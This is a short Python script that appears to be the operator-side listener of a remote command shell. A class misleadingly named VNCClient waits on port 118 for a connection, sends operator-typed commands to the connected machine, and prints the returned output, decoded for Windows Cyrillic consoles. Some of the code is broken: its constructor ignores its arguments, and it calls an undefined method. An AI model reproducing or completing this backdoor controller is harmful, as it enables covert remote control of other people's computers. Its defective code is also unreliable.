import pyautogui
import socket
import base64
import subprocess
import json
import time
import os
from lib.host import ipadd


class VNCClient:
    def __init__(self, ip, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.host = ipadd
        self.port = 118
        self.s.bind((self.host, self.port))
        self.s.listen(1)
        self.conn, self.addr = self.s.accept()
        while True:
            self.a = input('cmd: ')
            self.conn.send(self.a.encode())
            print(f"shareWin = {self.a}")
            # self.logg = self.conn.recv(1024)
            # self.logg = self.logg.decode()
            # print(str(self.logg.encode()))

            if self.a[-3:] == 'exe':
                self.logg = self.conn.recv(1024)
                self.logg = self.logg.decode()
                print(str(self.logg.encode()))
            else:
                self.cmd_process = self.conn.recv(5000)
                self.cmd_process = str(self.cmd_process, "cp866")
                print(self.cmd_process)

            self.a = 'X'
            self.conn.send(self.a.encode())
            print(f"shareWin = {self.a}")


myclient = VNCClient(ipadd, 118)
myclient.execute_handler()
